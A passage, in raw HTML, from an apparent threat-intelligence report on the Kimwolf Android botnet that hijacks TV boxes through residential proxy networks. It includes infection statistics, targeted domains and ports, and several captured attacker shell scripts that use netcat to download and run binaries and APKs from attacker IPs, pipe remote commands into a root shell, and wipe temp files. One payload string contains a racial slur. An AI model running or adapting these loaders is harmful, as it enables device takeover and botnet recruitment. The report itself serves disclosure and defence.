70%5B.%5D40%208081%20%7C%7C%20busybox%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208081%20%7C%7C%20busybox1.11%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208081%20%7C%7C%20busybox1%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208081)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fapp0.apk%0Aecho%20-en%2012345678901234567890124%20%7C%20(toybox%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208082%20%7C%7C%20busybox%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208082%20%7C%7C%20busybox1.11%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208082%20%7C%7C%20busybox1%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D40%208082)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fapp0%0A%0Achmod%20%2Bx%20%24SAVE_DIR%2Fapp0%20%5C%0A%20%7C%7C%20chmod%20777%20%24SAVE_DIR%2Fapp0%0A%24SAVE_DIR%2Fapp0%20android-tv-npv2%0A%0A%23%20droid%20only%0A%0Apm%20uninstall%20com.abcproxy.proxysdk%0Apm%20uninstall%20com.n2.systemservice062%0Apm%20uninstall%20com.n2.systemservice0644%0Apm%20uninstall%20com.n2.systemservice063%0Apm%20uninstall%20com.n2.systemservice061%0A%0Acmd%20package%20install%20-g%20-r%20%24SAVE_DIR%2Fapp0.apk%20%5C%0A%20%7C%7C%20cmd%20package%20install%20-t%20-g%20%24SAVE_DIR%2Fapp0.apk%20%5C%0A%20%7C%7C%20cmd%20package%20install%20%24SAVE_DIR%2Fapp0.apk%20%5C%0A%20%7C%7C%20pm%20install%20-g%20-r%20%24SAVE_DIR%2Fapp0.apk%20%5C%0A%20%7C%7C%20pm%20install%20-g%20-t%20%24SAVE_DIR%2Fapp0.apk%0Aam%20start-service%20-n%20com.a.androidsvc%2F.SDKService%0Apm%20enable%20com.a.androidsvc%0Aam%20start-foreground-service%20-n%20com.a.androidsvc%2F.SDKService%0Arm%20-rf%20%2Fdata%2Flocal%2Ftmp%2F*%0A%0A%23%20reboot%20-f%20%7C%7C%20reboot%0A%23%20svc%20power%20reboot" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">SAVE_DIR=/data/local/tmp</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text">echo -en 12345678901234567890124 | (toybox nc 89[.]39[.]70[.]40 8081 || busybox nc 89[.]39[.]70[.]40 8081 || busybox1.11 nc 89[.]39[.]70[.]40 8081 || busybox1 nc 89[.]39[.]70[.]40 8081) &gt; /data/local/tmp/app0.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text">echo -en 12345678901234567890124 | (toybox nc 89[.]39[.]70[.]40 8082 || busybox nc 89[.]39[.]70[.]40 8082 || busybox1.11 nc 89[.]39[.]70[.]40 8082 || busybox1 nc 89[.]39[.]70[.]40 8082) &gt; /data/local/tmp/app0</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">5</span><span class="research-code-text">chmod +x $SAVE_DIR/app0 \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">6</span><span class="research-code-text"> || chmod 777 $SAVE_DIR/app0</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">7</span><span class="research-code-text">$SAVE_DIR/app0 android-tv-npv2</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">8</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">9</span><span class="research-code-text"># droid only</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">10</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">11</span><span class="research-code-text">pm uninstall com.abcproxy.proxysdk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">12</span><span class="research-code-text">pm uninstall com.n2.systemservice062</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">13</span><span class="research-code-text">pm uninstall com.n2.systemservice0644</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">14</span><span class="research-code-text">pm uninstall com.n2.systemservice063</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">15</span><span class="research-code-text">pm uninstall com.n2.systemservice061</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">16</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">17</span><span class="research-code-text">cmd package install -g -r $SAVE_DIR/app0.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">18</span><span class="research-code-text"> || cmd package install -t -g $SAVE_DIR/app0.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">19</span><span class="research-code-text"> || cmd package install $SAVE_DIR/app0.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">20</span><span class="research-code-text"> || pm install -g -r $SAVE_DIR/app0.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">21</span><span class="research-code-text"> || pm install -g -t $SAVE_DIR/app0.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">22</span><span class="research-code-text">am start-service -n com.a.androidsvc/.SDKService</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">23</span><span class="research-code-text">pm enable com.a.androidsvc</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">24</span><span class="research-code-text">am start-foreground-service -n com.a.androidsvc/.SDKService</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">25</span><span class="research-code-text">rm -rf /data/local/tmp/*</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">26</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">27</span><span class="research-code-text"># reboot -f || reboot</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">28</span><span class="research-code-text"># svc power reboot</span></span></code></pre></figure><p class="research-portable-paragraph"></p><p class="research-portable-paragraph">During this period, the Kimwolf actors used a variety of domains and methods to circumvent restrictions and compromise devices. The following is an exhaustive list of domains and IPs observed targeting the residential proxy providers. (EDIT:  Do not import this as a list of IOCs unless you are a proxy provider, please refer to the iOCs section of this report if you are an organization.)</p><p class="research-portable-paragraph"><strong class="text-contrast-high">Domains:</strong></p><ul class="research-bullet-list"><li>localhost</li><li>127[.]0[.]0[.]0</li><li>127[.]0[.]0[.]1</li><li>127[.]0[.]0[.]2</li><li>0[.]0[.]0[.]0</li><li>xd[.]resi[.]to</li><li>xd[.]mob[.]to</li><li>onetwoseven[.]14emeliaterracewestroxburyma02132[.]su</li><li>lolxd[.]713mtauburnctcolumbusoh43085[.]st</li></ul><p class="research-portable-paragraph"><strong class="text-contrast-high">Targeted Ports:</strong></p><ul class="research-bullet-list"><li>3222</li><li>5555</li><li>5858</li><li>12108</li></ul><p class="research-portable-paragraph">Kimwolf’s scanning of proxy networks was at an unprecedented scale, with them holding the number one position many times for the most-targeted domain. Their scanning was often 24/7, with downtime limited to null routing or infrastructure changes.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/1943afc8e792fa46af8eda35b1c2944cfed04c70-1999x686.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Synthient capturing the various Kimwolf scanning and exploitation attempts." loading="lazy" width="1999" height="686"/><figcaption>Fig 2. Synthient capturing the various Kimwolf scanning and exploitation attempts.</figcaption></figure><section class="research-section research-portable-section" id="infection-demographic"><h2>Infection Demographic</h2></section><p class="research-portable-paragraph">Synthient’s Research Team believes Kimwolfs&#x27; infected device count to be well above 2 million, with significant numbers in Vietnam, Brazil, India, and Saudi Arabia. Even with their device count hovering around 2 million, Synthient’s Research Team observes around 12 million unique IP addresses per week for Kimwolf.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/552369075366165a910e1cffbe190504094803a2-1698x808.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Kimwolf geographic distribution of compromised devices." loading="lazy" width="1698" height="808"/><figcaption>Fig 3. Kimwolf geographic distribution of compromised devices.</figcaption></figure><p class="research-portable-paragraph">Synthient’s Research Team also received a screenshot from the backend Grafana instance in early November that matches this distribution. Please note the massive growth in the past 2 months.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/a6dbe3c031c7e71e523b64ce8c23fba6df9f04a6-1999x916.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Kimwolf&#x27;s internal Grafana instance" loading="lazy" width="1999" height="916"/><figcaption>Fig 4. Kimwolf&#x27;s internal Grafana instance.</figcaption></figure><p class="research-portable-paragraph">Upon analyzing exposed devices part of IPIDEAs proxy pool, we found that 67% of all Android devices are unauthenticated, leaving them vulnerable to remote code execution. From our scans, we found approximately 6 million vulnerable IPs (i.e., unique IPv6 or IPv4 addresses). These devices are often shipped pre-infected with SDKs from proxy providers. Once part of the residential proxy pool, Kimwolf will have scanned and exploited the device within minutes.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/025c12efc0fb223e95e90984e7ac6c176681be38-1999x1666.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="67% of connected devices responding as unauthenticated" loading="lazy" width="1999" height="1666"/><figcaption>Fig 5. 67% of connected devices responding as unauthenticated.</figcaption></figure><p class="research-portable-paragraph">An analysis of the infected device&#x27;s product name (<span>ro.product.name</span>) yields the following stats. TV BOX, HiDPTAndroid, and SMART_TV are among the top compromised devices.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/e61dd4fd9050e497c96dc64b067f7cf750bd52b2-1999x1111.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Top compromised product models" loading="lazy" width="1999" height="1111"/><figcaption>Fig 6. Top compromised product models.</figcaption></figure><p class="research-portable-paragraph">Analyzing the device name (<span>ro.product.device</span>), we see the following breakdown. The over-representation of devices indicates they arrive pre-infected. Synthient’s Research Team purchased several devices from the list, which corroborated this theory, showing that the devices were already running a malicious proxy SDK.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/57fec5146e3a85012e59f7f76f62c4ae3c5ac7cf-1999x1111.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Top compromised product devices." loading="lazy" width="1999" height="1111"/><figcaption>Fig 7. Top compromised product devices.</figcaption></figure><p class="research-portable-paragraph">A complete breakdown of impacted devices can be found <a href="https://github.com/synthient/public-research/tree/main/2026/01/kimwolf" target="_blank" rel="noreferrer">Kimwolf research tools and indicators</a>.</p><section class="research-section research-portable-section" id="kimwolf-analysis"><h2>Kimwolf Analysis</h2></section><p class="research-portable-paragraph">XLab has published a comprehensive analysis of both V4 and V5 of the Kimwolf botnet. We <a href="https://blog.xlab.qianxin.com/kimwolf-botnet-en/" target="_blank" rel="noreferrer">refer</a> to their publication for a complete analysis, as we will only cover changes to the latest Kimwolf botnet. Synthient received its final payload on December 27th before IPIDEA implemented a security patch. Due to IPIDEA&#x27;s rapid deployment of the security patch, the final payload from December 27th was successfully mitigated before a full binary capture could be completed. As a result, the latest Kimwolf version downloaded was from December 25th.</p><figure class="research-code-block" data-code-block="true" data-code="(echo%20-en%20fuckyouniggerfuckyounag%20%7C%20(toybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%201024%7C%7Cbusybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%201024%7C%7Cbusybox%20telnet%20213%5B.%5D193%5B.%5D253%5B.%5D1%201024%7C%7Cbusybox1.11%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%201024)%20%7C%20(su%20root%20sh%20%7C%7C%20sh))%20%3E%20%2Fdev%2Fnull%202%3E%261%5Cn(echo%20-en%2012345678901234567890123%20%7C%20(toybox%20nc%2062%5B.%5D210%5B.%5D172%5B.%5D157%20443%7C%7Cbusybox%20nc%2062%5B.%5D210%5B.%5D172%5B.%5D157%20443%7C%7Cbusybox%20telnet%2062%5B.%5D210%5B.%5D172%5B.%5D157%20443%7C%7Cbusybox1.11%20nc%2062%5B.%5D210%5B.%5D172%5B.%5D157%20443)%20%7C%20(su%20root%20sh%20%7C%7C%20sh))%20%3E%20%2Fdev%2Fnull%202%3E%261" data-code-filename="December 25th Payload.txt"><figcaption><span class="research-code-title" title="December 25th Payload">December 25th Payload</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="December 25th Payload source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">(echo -en fuckyouniggerfuckyounag | (toybox nc 213[.]193[.]253[.]1 1024||busybox nc 213[.]193[.]253[.]1 1024||busybox telnet 213[.]193[.]253[.]1 1024||busybox1.11 nc 213[.]193[.]253[.]1 1024) | (su root sh || sh)) &gt; /dev/null 2&gt;&amp;1\n(echo -en 12345678901234567890123 | (toybox nc 62[.]210[.]172[.]157 443||busybox nc 62[.]210[.]172[.]157 443||busybox telnet 62[.]210[.]172[.]157 443||busybox1.11 nc 62[.]210[.]172[.]157 443) | (su root sh || sh)) &gt; /dev/null 2&gt;&amp;1</span></span></code></pre></figure><p class="research-portable-paragraph">When the payload runs, the following script is executed. This installs the latest version of the Kimwolf binary. These binaries are installed as “botless” and “com.abcproxy.sdk”. Please note that the threat actors named the binary “com.abcproxy.sdk” to associate this activity with IPIDEA, which has no involvement with the Kimwolf actors.</p><figure class="research-code-block" data-code-block="true" data-code="%23!%2Fsystem%2Fbin%2Fsh%0Aif%20!%20mkdir%20%2Fdata%2Flocal%2Ftmp%2F.locks%202%3E%2Fdev%2Fnull%3B%20then%0A%23%20%20%20%20echo%20LOCK!%0A%20%20%20%20exit%200%0Afi%0A%0A%23%20np%0Acd%20%2Fdata%2Flocal%2Ftmp%3B%20rm%20-rf%20rolf%0Aecho%20-en%20fuckyouniggerfuckyounag%20%7C%20(toybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%201026%20%7C%7C%20busybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%201026)%20%3E%20rolf%0Achmod%20777%20%24(pwd)%2Frolf%3B%20%24(pwd)%2Frolf%20botless%0A%0A%23%20p%0Aecho%20-en%20fuckyouniggerfuckyounag%20%7C%20(toybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%204200%20%7C%7C%20busybox%20nc%20213%5B.%5D193%5B.%5D253%5B.%5D1%204200)%20%3E%20app.apk%0Acmd%20package%20install%20-g%20-r%20%2Fdata%2Flocal%2Ftmp%2Fapp.apk%20%5C%0A%20%7C%7C%20cmd%20package%20install%20-t%20-g%20%2Fdata%2Flocal%2Ftmp%2Fapp.apk%20%5C%0A%20%7C%7C%20cmd%20package%20install%20%2Fdata%2Flocal%2Ftmp%2Fapp.apk%20%5C%0A%20%7C%7C%20pm%20install%20-g%20-r%20%2Fdata%2Flocal%2Ftmp%2Fapp.apk%20%5C%0A%20%7C%7C%20pm%20install%20-g%20-t%20%2Fdata%2Flocal%2Ftmp%2Fapp.apk%0Apm%20enable%20com.abcproxy.lolsdk%0Aam%20start-foreground-service%20-n%20com.abcproxy.lolsdk%2F.SDKService%0A%0Aecho%20-en%2012345678901234567890123%20%7C%20(toybox%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D110%20443%20%7C%7C%20busybox%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D110%20443%20%7C%7C%20nc%2089%5B.%5D39%5B.%5D70%5B.%5D110%20443)%7Csh%0A%0Arm%20-rf%20%2Fdata%2Flocal%2Ftmp%2F.locks" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">#!/system/bin/sh</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text">if ! mkdir /data/local/tmp/.locks 2&gt;/dev/null; then</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text">#    echo LOCK!</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text">    exit 0</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">5</span><span class="research-code-text">fi</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">6</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">7</span><span class="research-code-text"># np</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">8</span><span class="research-code-text">cd /data/local/tmp; rm -rf rolf</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">9</span><span class="research-code-text">echo -en fuckyouniggerfuckyounag | (toybox nc 213[.]193[.]253[.]1 1026 || busybox nc 213[.]193[.]253[.]1 1026) &gt; rolf</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">10</span><span class="research-code-text">chmod 777 $(pwd)/rolf; $(pwd)/rolf botless</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">11</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">12</span><span class="research-code-text"># p</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">13</span><span class="research-code-text">echo -en fuckyouniggerfuckyounag | (toybox nc 213[.]193[.]253[.]1 4200 || busybox nc 213[.]193[.]253[.]1 4200) &gt; app.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">14</span><span class="research-code-text">cmd package install -g -r /data/local/tmp/app.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">15</span><span class="research-code-text"> || cmd package install -t -g /data/local/tmp/app.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">16</span><span class="research-code-text"> || cmd package install /data/local/tmp/app.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">17</span><span class="research-code-text"> || pm install -g -r /data/local/tmp/app.apk \</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">18</span><span class="research-code-text"> || pm install -g -t /data/local/tmp/app.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">19</span><span class="research-code-text">pm enable com.abcproxy.lolsdk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">20</span><span class="research-code-text">am start-foreground-service -n com.abcproxy.lolsdk/.SDKService</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">21</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">22</span><span class="research-code-text">echo -en 12345678901234567890123 | (toybox nc 89[.]39[.]70[.]110 443 || busybox nc 89[.]39[.]70[.]110 443 || nc 89[.]39[.]70[.]110 443)|sh</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">23</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">24</span><span class="research-code-text">rm -rf /data/local/tmp/.locks</span></span></code></pre></figure><p class="research-portable-paragraph">Both binaries are almost identical, with the rolf binary making a slight difference in its TLS implementation. Additionally, the libdevice[.]so binary uses an Android APK for delivery, whereas the botless binary is dropped to the /rolf/ directory.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=640&amp;q=86&amp;auto=format 640w, 